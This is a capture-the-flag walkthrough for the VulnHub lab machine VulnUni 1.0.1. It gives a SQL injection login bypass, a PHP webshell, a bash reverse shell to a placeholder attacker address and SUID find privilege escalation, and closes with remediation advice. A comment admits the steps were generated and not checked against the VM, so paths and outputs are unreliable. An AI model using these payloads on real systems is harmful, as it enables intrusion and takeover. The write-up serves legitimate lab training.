# VulnUni: 1.0.1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Root Flag** | /root/flag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/vulnuni-101,439/) |

<!-- generated from known techniques; verify against live VM -->

## Attack Summary

nmap → web enumeration → University Management System SQLi login bypass → admin panel file upload → PHP webshell → reverse shell → SUID find privesc → root

## Methodology

1. Network discovery and port scan
2. Web enumeration
3. SQLi login bypass in University Management System
4. Admin panel file upload for PHP webshell
5. Reverse shell
6. SUID binary privilege escalation

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Expected open ports: 22 (SSH), 80 (HTTP).

---

## Step 2: Web Enumeration

```bash
dirb http://<TARGET_IP>/
nikto -h http://<TARGET_IP>/
```

Discover the University Management System login page at `/umsAdmin/` or similar path.

---

## Step 3: SQL Injection Login Bypass

The admin login panel is vulnerable to classic SQL injection. Use a basic bypass:

```
Username: ' or 1=1-- -
Password: anything
```

This bypasses authentication and grants access to the admin dashboard.

---

## Step 4: File Upload → PHP Webshell

In the admin panel, locate the student photo or file upload functionality. Upload a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

Save it as `shell.php` and upload it. The file lands in a publicly accessible upload directory.

```bash
# Discover upload directory
curl "http://<TARGET_IP>/umsAdmin/uploads/shell.php?cmd=id"
# uid=33(www-data)
```

---

## Step 5: Reverse Shell

```bash
# Attacker
nc -lvp 4444

# Trigger reverse shell via the webshell
curl "http://<TARGET_IP>/umsAdmin/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'"
```

Stabilise:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Step 6: Privilege Escalation — SUID find

```bash
find / -perm -u=s -type f 2>/dev/null
# Locate /usr/bin/find (SUID)
```

Exploit SUID find:

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
id
# uid=33(www-data) gid=33(www-data) euid=0(root)
cat /root/flag.txt
```

---

## Lessons Learned

1. **SQL injection in login forms** — use parameterised queries; never build SQL with string concatenation
2. **Unrestricted file upload** — validate file type server-side (not just client-side); block PHP execution in upload directories
3. **SUID find** — `find` with SUID bit allows trivial privilege escalation; audit and remove unnecessary SUID permissions

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| SQLi login bypass | Use prepared statements (`PDO`/`mysqli` with bind_param) |
| PHP file upload | Validate MIME type and extension; use a non-executable upload directory |
| SUID find | `chmod u-s /usr/bin/find` |
